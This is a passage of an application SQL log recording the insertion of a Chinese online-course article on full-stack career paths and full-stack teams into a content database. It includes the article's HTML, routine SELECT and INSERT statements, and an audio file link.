data-slate-leaf="true" data-offset-key="535:0" data-first-offset="true"><span data-slate-string="true">因此 
SRE 需要尽力确保服务每分每秒的正常运行，他们的扮演的角色可远不只是“救火队长”，在“时间就是金钱”的压力环境下，严谨而大胆，快速定位和解决问题，但更重要的是，帮助不同的团队“防患于未然”，比如主导和把关新建服务的可靠性设计。SRE 
有时要解决基础设施的问题，有时要分析服务端的压力来源，有时则要搞定网页上造成大量用户访问困难的“小 bug”。很显然，一个狭窄领域知识的工程师，是不可能胜任这样的岗位的，对于从端到端俯瞰整个流程的能力，Web 
全栈工程师有着天然的优势。</span></span></span> </div> <h3 class="se-22f1f193" data-slate-type="heading" 
data-slate-object="block" data-key="536"><span data-slate-object="text" data-key="537"><span 
data-slate-leaf="true" data-offset-key="537:0" data-first-offset="true"><span data-slate-string="true">横向：点亮另一棵技能树</span></span></span></h3> 
<div class="se-a3d85c0d " data-slate-type="paragraph" data-slate-object="block" data-key="538"> 
<span data-slate-object="text" data-key="539"><span data-slate-leaf="true" data-offset-key="539:0" 
data-first-offset="true"><span data-slate-string="true">下面再来看另一种分类，如果你发现自己的兴趣或是专长，并不在 Web 全栈领域方面，而是跃跃欲试地盯上了软件技术领域的另外一类角色，那其实也是一件可喜可贺的事情。毕竟，越早明确自己的兴趣和专长，在职业中做出变更的决定，就越能帮助自己接近目标，这其实有点像 
RPG 游戏中的转职了。下面我就来举几个横向衍化的例子：</span></span></span> </div> <div class="se-9d4d311c " data-slate-type="paragraph" 
data-slate-object="block" data-key="540"> <span data-slate-object="text" data-key="541"><span 
data-slate-leaf="true" data-offset-key="541:0" data-first-offset="true"><span class="se-8f321799" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">1. 数据方向</span></span></span></span> 
</div> <div class="se-433da844 " data-slate-type="paragraph" data-slate-object="block" data-key="542"> 
<span data-slate-object="text" data-key="543"><span data-slate-leaf="true" data-offset-key="543:0" 
data-first-offset="true"><span data-slate-string="true">这里的数据未必指大数据。如果我们退回到 10 年前，数据所扮演的角色，远没有当今的软件行业这样重要。如果你在 
Web 全栈的学习过程中发现，自己对于数据有着超乎平常人的敏感度，或者对于数据本身所蕴含的事实原理充满兴趣，那么有一些和数据密切相关的职业角色，可能会成为你未来职业发展的一个好的选择。</span></span></span> 
</div> <div class="se-33627cb6 " data-slate-type="paragraph" data-slate-object="block" data-key="544"> 
<span data-slate-object="text" data-key="545"><span data-slate-leaf="true" data-offset-key="545:0" 
data-first-offset="true"><span data-slate-string="true">比如说数据科学家（Data Scientist）、数据分析师（Data 
Analyst）和商业智能工程师（Business Intelligence Engineer），其中的前两者，我在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="546" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="547"><span data-slate-leaf="true" data-offset-key="547:0" data-first-offset="true"><span 
data-slate-string="true">[第 20 讲]</span></span></span></a><span data-slate-object="text" data-key="548"><span 
data-slate-leaf="true" data-offset-key="548:0" data-first-offset="true"><span data-slate-string="true"> 
中有过介绍。这些角色，都需要具备相当的数据分析能力，掌握一定的统计知识。全栈工程师的背景，能让你在胜任这样的角色的时候，具备更综合的工程能力，从而脱颖而出。比如你可以更容易地设计和改进数据分析工具，比如你已经掌握了一定的数据可视化技术（参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="549" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="550"><span data-slate-leaf="true" data-offset-key="550:0" 
data-first-offset="true"><span data-slate-string="true">[第 18 讲]</span></span></span></a><span 
data-slate-object="text" data-key="551"><span data-slate-leaf="true" data-offset-key="551:0" 
data-first-offset="true"><span data-slate-string="true">），就可以迅速地将实现方案落地。</span></span></span> 
</div> <div class="se-db214054 " data-slate-type="paragraph" data-slate-object="block" data-key="552"> 
<span data-slate-object="text" data-key="553"><span data-slate-leaf="true" data-offset-key="553:0" 
data-first-offset="true"><span class="se-a24b2057" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. 系统方向</span></span></span></span> </div> <div class="se-75dec48c 
" data-slate-type="paragraph" data-slate-object="block" data-key="554"> <span data-slate-object="text" 
data-key="555"><span data-slate-leaf="true" data-offset-key="555:0" data-first-offset="true"><span 
data-slate-string="true">这部分往往来自于对软件系统有着更高追求的工程师，这个方向在横向衍化中具备着相当的比例，比如，有一些软件工程师职位，从职责上看，其实和 
Web 全栈工程师没有本质上的区别，但是因为其所涉及的项目、产品和技术领域独立在传统的 Web 之外，我就把它们单独拿出来介绍了。</span></span></span> </div> 
<div class="se-c9214b7b " data-slate-type="paragraph" data-slate-object="block" data-key="556"> 
<span data-slate-object="text" data-key="557"><span data-slate-leaf="true" data-offset-key="557:0" 
data-first-offset="true"><span data-slate-string="true">我觉得这一点可以以我自己为例，我这几年所呆的团队，开发和维护的产品中，都包括典型的分布式系统。两年前是一个分布式计算平台，Amazon 
所有产品的成本和利润就是在它上面完成计算的；如今在 Oracle 则是一个分布式工作流引擎。老实说，它们都和传统的 Web 全栈没有什么“直接关系”，但是正如我在专栏开始的时候所说，技术都是相通的，从全栈领域学到的那些套路和方法，可以帮助我在新的软件领域上手那些新技术。</span></span></span> 
</div> <div class="se-52f6ac0e " data-slate-type="paragraph" data-slate-object="block" data-key="558"> 
<span data-slate-object="text" data-key="559"><span data-slate-leaf="true" data-offset-key="559:0" 
data-first-offset="true"><span data-slate-string="true">我知道很多程序员朋友，从远期看都想成为架构师，比如平台架构师，解决方案架构师等等。但凡谈及“架构”基本上都意味着一个模糊的、足够大的领域。在我所了解的那些互联网巨头中，这些高级研发职位都要求跨团队、跨项目的技术决策和合作，很难想象一个狭窄领域诞生一个架构师级别的角色，而这一点，又得益于我们如今学得广、学得杂而夯实的基础。</span></span></span> 
</div> <div class="se-683c2a31 " data-slate-type="paragraph" data-slate-object="block" data-key="560"> 
<span data-slate-object="text" data-key="561"><span data-slate-leaf="true" data-offset-key="561:0" 
data-first-offset="true"><span class="se-1ac406a5" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">3. 产品经理</span></span></span></span> </div> <div class="se-5a011a32 
" data-slate-type="paragraph" data-slate-object="block" data-key="562"> <span data-slate-object="text" 
data-key="563"><span data-slate-leaf="true" data-offset-key="563:0" data-first-offset="true"><span 
data-slate-string="true">产品经理可以说也是一个非常常见的方向，产品经理和程序员之间相爱相杀的故事，已经“烂大街”了。“土生土长”的产品经理的比例其实不算太高，很多公司的产品经理都是从不同的岗位转过来的。比如运维岗，这样的产品经理，往往会额外地关注产品的可靠性以及运维的难度，毕竟他们是从这条路走过来的，深知其重要性。</span></span></span> 
</div> <div class="se-cdd64401 " data-slate-type="paragraph" data-slate-object="block" data-key="564"> 
<span data-slate-object="text" data-key="565"><span data-slate-leaf="true" data-offset-key="565:0" 
data-first-offset="true"><span data-slate-string="true">同样的，有着全栈工程师背景的产品经理，显然更能够从工程的角度出发，去理解需求的实现，理解用户交互过程背后的原理，撰写更优秀的非功能需求的产品设计文档，也可以轻而易举地做出 
HTML 快速原型。</span></span></span> </div> <h2 class="se-a04dec45" data-slate-type="heading" data-slate-object="block" 
data-key="566"><span data-slate-object="text" data-key="567"><span data-slate-leaf="true" data-offset-key="567:0" 
data-first-offset="true"><span data-slate-string="true">项目和团队</span></span></span></h2> <div 
class="se-874d0e78 " data-slate-type="paragraph" data-slate-object="block" data-key="568"> 
<span data-slate-object="text" data-key="569"><span data-slate-leaf="true" data-offset-key="569:0" 
data-first-offset="true"><span data-slate-string="true">上面我只是从个人角度介绍了全栈的衍化，这也是最常规的思路。但是，我们也完全可以从更多的角度来审视这个概念，比如说项目和团队。</span></span></span> 
</div> <div class="se-541d3390 " data-slate-type="paragraph" data-slate-object="block" data-key="570"> 
<span data-slate-object="text" data-key="571"><span data-slate-leaf="true" data-offset-key="571:0" 
data-first-offset="true"><span data-slate-string="true">在这里我想说的全栈项目，是指能够从不同的软件领域和软件技术的角度，覆盖端到端需求并解决问题的项目或项目集合，这里未必指单个的项目，而可以是多个关联项目所组成的集合；相应的，全栈团队，其实我在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="572" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="573"><span data-slate-leaf="true" data-offset-key="573:0" 
data-first-offset="true"><span data-slate-string="true">[第 20 讲]</span></span></span></a><span 
data-slate-object="text" data-key="574"><span data-slate-leaf="true" data-offset-key="574:0" 
data-first-offset="true"><span data-slate-string="true"> 中已经介绍过了，是指一个团队具备较多方面、较多层次的技能，联合协作，去解决某一个领域的问题。</span></span></span> 
</div> <div class="se-01ac88e2 " data-slate-type="paragraph" data-slate-object="block" data-key="575"> 
<span data-slate-object="text" data-key="576"><span data-slate-leaf="true" data-offset-key="576:0" 
data-first-offset="true"><span data-slate-string="true">为什么要讲这个？因为我们整个专栏都在专注于 Web 全栈工程技能这一点上，但是我不希望在专栏之后，因为它而给你造成了思考的禁锢。我想学到了今天，你已经对于程序员掌握全栈技能的优势有了自己的理解，可是这一部分，完全可以衍化到项目和团队这样的维度上。</span></span></span> 
</div> <h3 class="se-cda80a83" data-slate-type="heading" data-slate-object="block" data-key="577"><span 
data-slate-object="text" data-key="578"><span data-slate-leaf="true" data-offset-key="578:0" 
data-first-offset="true"><span data-slate-string="true">我自己的故事</span></span></span></h3> <div 
class="se-b6288a93 " data-slate-type="paragraph" data-slate-object="block" data-key="579"> 
<span data-slate-object="text" data-key="580"><span data-slate-leaf="true" data-offset-key="580:0" 
data-first-offset="true"><span data-slate-string="true">在我工作的最初几年，虽然已经是一个全栈工程师了，个人技术上虽然收获很大，但是并没有产生这一个层次的认识。直到我加入了 
Amazon，它的工程师文化对我之后的成长产生了很大的影响，也就是从那时候开始，我有了对于全栈项目和全栈团队的思考。</span></span></span> </div> <div 
class="se-bb277983 " data-slate-type="paragraph" data-slate-object="block" data-key="581"> 
<span data-slate-object="text" data-key="582"><span data-slate-leaf="true" data-offset-key="582:0" 
data-first-offset="true"><span data-slate-string="true">拿我自己来举一个例子，我曾经在销量预测团队中工作，我们整个团队五十余人，用一句话来 
粗略地概括我们每天的工作，就是给几千万的商品预测销量。显然这就是一个全栈的大项目，里面有十几、二十个不同领域的小项目，包括销量预测的计算平台、高可用数据分发服务、数据同步服务、预测数据的序列化和存储服务，数据分析的可视化工具、预测统计和健康监控系统等等。</span></span></span> 
</div> <div class="se-771c8fb6 " data-slate-type="paragraph" data-slate-object="block" data-key="583"> 
<span data-slate-object="text" data-key="584"><span data-slate-leaf="true" data-offset-key="584:0" 
data-first-offset="true"><span data-slate-string="true">因此，从项目的多样性，你就能够想象团队角色的多样性（具体内容请参见 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="585" class="se-9a604d3a se-490c3d6a"><span 
data-slate-object="text" data-key="586"><span data-slate-leaf="true" data-offset-key="586:0" 
data-first-offset="true"><span data-slate-string="true">[第 20 讲]</span></span></span></a><span 
data-slate-object="text" data-key="587"><span data-slate-leaf="true" data-offset-key="587:0" 
data-first-offset="true"><span data-slate-string="true">）。团队中有着许许多多擅长不同领域的角色，包括软件工程师、数据科学家、数据分析师、产品经理和支持工程师等等。而单说我们最熟悉的软件工程师，就具备着不同背景、不同专长，比如有擅长 
MR 相关框架和技术的负责计算平台的工程师，有维护高可用数据分发服务的工程师，也有熟悉 Web 前后端开发的负责数据可视化的工程师等等。</span></span></span> </div> 
<div class="se-28c305fe " data-slate-type="paragraph" data-slate-object="block" data-key="588"> 
<span data-slate-object="text" data-key="589"><span data-slate-leaf="true" data-offset-key="589:0" 
data-first-offset="true"><span data-slate-string="true">后来我又加入了成本核算团队，项目也好，团队也好，技术也罢，虽然存在很大不同，可全栈的特性却是一致的。比方说，MR 
的框架和工具从 Hadoop 系变成了 Spark 系，主要编程语言从 Java 变成了 Scala，工作流引擎从一个老旧的自研引擎服务变成了一个基于 SWF（Simple Work 
Flow）开发的在公司“内部开源”的新产品（即便放到今天来说，我依然觉得，它的共享资源管理等某几个核心功能，还是要比如今市面上我见到的都要优秀一些）……可是那又怎样，项目依然包含多个层次、不同的类别，而团队则依然包含类似分类的、多样的角色。</span></span></span> 
</div> <h3 class="se-55d8241f" data-slate-type="heading" data-slate-object="block" data-key="590"><span 
data-slate-object="text" data-key="591"><span data-slate-leaf="true" data-offset-key="591:0" 
data-first-offset="true"><span data-slate-string="true">优势</span></span></span></h3> <div class="se-858f3645 
" data-slate-type="paragraph" data-slate-object="block" data-key="592"> <span data-slate-object="text" 
data-key="593"><span data-slate-leaf="true" data-offset-key="593:0" data-first-offset="true"><span 
data-slate-string="true">在我看来，一个全栈的项目和团队，至少可以具备这样几个优势：</span></span></span> </div> <div class="se-fa823e09 
" data-slate-type="paragraph" data-slate-object="block" data-key="594"> <span data-slate-object="text" 
data-key="595"><span data-slate-leaf="true" data-offset-key="595:0" data-first-offset="true"><span 
data-slate-string="true">1. 从多样的角度出发，提供完整的解决方案。</span></span></span> </div> <div class="se-2a9ffb30 
" data-slate-type="paragraph" data-slate-object="block" data-key="596"> <span data-slate-object="text" 
data-key="597"><span data-slate-leaf="true" data-offset-key="597:0" data-first-offset="true"><span 
data-slate-string="true">正如同销量预测团队中，预测一个产品的销量是一个极端困难的事儿，需要多种机器学习的模型配合工作，对于不同类型的商品，应用不同的数学模型；而数据的获取、计算、分发……这些又都需要软件来完成；数据的清洗、转换、分析又需要多种数据和统计知识，配合合适的工具来做到。对于一个角色单一的团队或项目，显然是无法做到这样一个复杂的过程的。</span></span></span> 
</div> <div class="se-4437b4cb " data-slate-type="paragraph" data-slate-object="block" data-key="598"> 
<span data-slate-object="text" data-key="599"><span data-slate-leaf="true" data-offset-key="599:0" 
data-first-offset="true"><span data-slate-string="true">2. 具备包容的团队，为不同特长和兴趣的人才提供创造价值的平台。</span></span></span> 
</div> <div class="se-04d2d2c5 " data-slate-type="paragraph" data-slate-object="block" data-key="600"> 
<span data-slate-object="text" data-key="601"><span data-slate-leaf="true" data-offset-key="601:0" 
data-first-offset="true"><span data-slate-string="true">3. 保持整体上健康和多样的思考角度，保证团队和产品的均衡发展。</span></span></span> 
</div> <div class="se-cae8e584 " data-slate-type="paragraph" data-slate-object="block" data-key="602"> 
<span data-slate-object="text" data-key="603"><span data-slate-leaf="true" data-offset-key="603:0" 
data-first-offset="true"><span data-slate-string="true">每年我们都会举办 Hackathon，大致就是，团队成员可以提出创意、“招兵买马”，完整的两、三天时间，自发组织小团队，团队里有产品经理、工程师和数据分析师等等不同角色，一起把这个创意做出快速原型。其中优秀的一部分会成为未来一年真正的项目和产品。各种创意火花碰撞，这是我最喜欢的一个地方。</span></span></span> 
</div> <h2 class="se-d2fb11bd" data-slate-type="heading" data-slate-object="block" data-key="604"><span 
data-slate-object="text" data-key="605"><span data-slate-leaf="true" data-offset-key="605:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-27583957 " data-slate-type="paragraph" data-slate-object="block" data-key="606"> 
<span data-slate-object="text" data-key="607"><span data-slate-leaf="true" data-offset-key="607:0" 
data-first-offset="true"><span data-slate-string="true">今天我聊了聊 Web 全栈工程师在完成核心技术的修炼之后，可以考虑的下一步和进一步的方向，也就是个人的全栈衍化；也从项目和团队的角度，讲了全栈的优势和重要性。</span></span></span> 
</div> <div class="se-ac8cbc20 " data-slate-type="paragraph" data-slate-object="block" data-key="608"> 
<span data-slate-object="text" data-key="609"><span data-slate-leaf="true" data-offset-key="609:0" 
data-first-offset="true"><span data-slate-string="true">不知道正在阅读的你，关于这方面，从职业规划的角度看，你的思路是怎样的，能简单分享一下吗？</span></span></span> 
</div> <h2 class="se-80ce7abc" data-slate-type="heading" data-slate-object="block" data-key="610"><span 
data-slate-object="text" data-key="611"><span data-slate-leaf="true" data-offset-key="611:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-1f109f45" data-slate-type="list" data-slate-object="block" data-key="612"> <div class="se-a15049ff 
se-900d7254" data-slate-type="list-line" data-slate-object="block" data-key="613"> <span data-slate-object="text" 
data-key="614"><span data-slate-leaf="true" data-offset-key="614:0" data-first-offset="true"><span 
data-slate-string="true">关于 SRE 这个角色，你可以参看 Google </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="615" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="616"><span data-slate-leaf="true" data-offset-key="616:0" data-first-offset="true"><span 
data-slate-string="true">自己的描述</span></span></span></a><span data-slate-object="text" data-key="617"><span 
data-slate-leaf="true" data-offset-key="617:0" data-first-offset="true"><span data-slate-string="true">，以及 
SRE 这个</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="618" 
class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" data-key="619"><span data-slate-leaf="true" 
data-offset-key="619:0" data-first-offset="true"><span data-slate-string="true">词条</span></span></span></a><span 
data-slate-object="text" data-key="620"><span data-slate-leaf="true" data-offset-key="620:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-22eb7be8 se-6303e970" data-slate-type="list-line" data-slate-object="block" data-key="621"> 
<span data-slate-object="text" data-key="622"><span data-slate-leaf="true" data-offset-key="622:0" 
data-first-offset="true"><span data-slate-string="true">关于文中提到的 Hackathon，想了解更多的话，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="623" class="se-9a604d3a se-490c3d6a"><span 
data-slate-object="text" data-key="624"><span data-slate-leaf="true" data-offset-key="624:0" 
data-first-offset="true"><span data-slate-string="true">这个</span></span></span></a><span data-slate-object="text" 
data-key="625"><span data-slate-leaf="true" data-offset-key="625:0" data-first-offset="true"><span 
data-slate-string="true">内容。</span></span></span> </div> </div> <div class="se-64bc1980" data-slate-type="image" 
data-slate-object="block" data-key="626"> <img class="se-baeeae41" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 5, 5) 
 {executed in 6 msec}
2020-11-19 11:01:03.019 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=5 
 {executed in 0 msec}
2020-11-19 11:01:03.020 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:01:03.021 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=5 
 {executed in 0 msec}
2020-11-19 11:01:03.021 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:01:03.022 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754863, 1605754863, 1, 'zh-hans', 0, 1, 1, 
0, '40丨全栈衍化：让全栈意味着更多', 1, 5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:03.029 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=5 
 {executed in 0 msec}
2020-11-19 11:01:03.029 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:01:03.030 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754863, 1605754863, 1, 'zh-hans', 0, 
1, 1, 0, '40丨全栈衍化：让全栈意味着更多', 'book', 1, 5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:03.035 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.035 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:01:03.036 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.037 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:01:03.038 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/8e29ff265s27a4e862d7321162f4e283?bkt=en-4d166c07188776156b32dc4a0b24b2173ead09f5fae1a2c99be772a55754401ea2d9380b454d3d35&fid=3757516097-778750-587544052578564&time=1605754861&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-lS2uIk8Gz%2FksR52iLV5DnsmiZ18%3D&to=92&size=11327430&sta_dx=11327430&sta_cs=1615&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1576766129&mtime=1605754779&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=11327430&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-65f038401c018b6cc36feb2d16d67f371d26b10f7099f8f789c49c168c5c152d3173cda5d5568a04&sl=76480590&expires=8h&rt=pr&r=987849775&mlogid=7501928428401703699&vbdid=2247232042&fin=40%E4%B8%A8%E5%85%A8%E6%A0%88%E8%A1%8D%E5%8C%96%EF%BC%9A%E8%AE%A9%E5%85%A8%E6%A0%88%E6%84%8F%E5%91%B3%E7%9D%80%E6%9B%B4%E5%A4%9A.m4a&bflag=92,34-92&rtype=1&dp-logid=7501928428401703699&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=90e00819b6f5425065bcc577b7e6f778841c1cbe5159e514&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=40%E4%B8%A8%E5%85%A8%E6%A0%88%E8%A1%8D%E5%8C%96%EF%BC%9A%E8%AE%A9%E5%85%A8%E6%A0%88%E6%84%8F%E5%91%B3%E7%9D%80%E6%9B%B4%E5%A4%9A.m4a', 
5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:03.041 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.041 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:01:03.042 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/8e29ff265s27a4e862d7321162f4e283?bkt=en-4d166c07188776156b32dc4a0b24b2173ead09f5fae1a2c99be772a55754401ea2d9380b454d3d35&fid=3757516097-778750-587544052578564&time=1605754861&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-lS2uIk8Gz%2FksR52iLV5DnsmiZ18%3D&to=92&size=11327430&sta_dx=11327430&sta_cs=1615&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1576766129&mtime=1605754779&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=11327430&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-65f038401c018b6cc36feb2d16d67f371d26b10f7099f8f789c49c168c5c152d3173cda5d5568a04&sl=76480590&expires=8h&rt=pr&r=987849775&mlogid=7501928428401703699&vbdid=2247232042&fin=40%E4%B8%A8%E5%85%A8%E6%A0%88%E8%A1%8D%E5%8C%96%EF%BC%9A%E8%AE%A9%E5%85%A8%E6%A0%88%E6%84%8F%E5%91%B3%E7%9D%80%E6%9B%B4%E5%A4%9A.m4a&bflag=92,34-92&rtype=1&dp-logid=7501928428401703699&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=90e00819b6f5425065bcc577b7e6f778841c1cbe5159e514&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=40%E4%B8%A8%E5%85%A8%E6%A0%88%E8%A1%8D%E5%8C%96%EF%BC%9A%E8%AE%A9%E5%85%A8%E6%A0%88%E6%84%8F%E5%91%B3%E7%9D%80%E6%9B%B4%E5%A4%9A.m4a', 
5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:03.045 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.045 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:01:03.046 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
